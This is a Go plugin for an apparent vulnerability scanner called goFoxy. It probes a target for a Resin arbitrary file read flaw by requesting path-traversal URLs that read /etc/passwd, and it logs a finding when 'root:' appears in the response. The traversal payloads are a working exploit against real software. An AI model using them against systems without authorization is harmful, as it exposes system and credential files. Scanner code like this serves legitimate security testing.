package plugins

import (
	"strconv"
	"net/http"
	"io/ioutil"
	"strings"
	"fmt"
	"goFoxy/manager"
	"goFoxy/common"
)

func init() {
	pl := resinFileRead{}
	pl.Name = "resinFileRead"
	pl.Author = "dk"
	pl.Default = true
	pl.Help = "Resin任意文件读取"
	manager.Regist(pl.Name, pl)
}

type resinFileRead struct {
	manager.Plugin
}

func (this resinFileRead) GetPluginInfo() map[string]string {
	infoMap := make(map[string]string)
	infoMap["name"] = this.Name
	infoMap["author"] = this.Author
	infoMap["default"] = strconv.FormatBool(this.Default)
	infoMap["flag"] = strconv.FormatBool(this.Flag)
	infoMap["help"] = this.Help
	return infoMap
}

func (this resinFileRead) SetPluginFlag(flag bool) bool {
	this.Flag = flag
	return true
}

func (this resinFileRead) Toggle() {
	if this.Flag {
		this.Flag = false
	} else {
		this.Flag = true
	}
}

func (this resinFileRead) Process(flow common.Flow) {
	url := flow.GetSafeBaseURL()
	dicts := []string{
		url + "/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
		url + "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd",
	}
	for index := range dicts {
		httpClient := http.Client{}
		resp, err := httpClient.Get(dicts[index])
		if err != nil {
			return
		}
		content, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return
		}
		resp.Body.Close()
		if strings.Contains(string(content), "root:") {
			tmpInfo := common.Vuln{FlowID: flow.ID}
			tmpInfo.Host = flow.Host
			tmpInfo.Title = "Resin任意文件读取漏洞"
			tmpInfo.Level = "中危"
			tmpInfo.Content = fmt.Sprintf("%s 存在 Resin任意文件读取漏洞", dicts[index])
			tmpInfo.LogVulnInfo()
			break
		}
	}
}
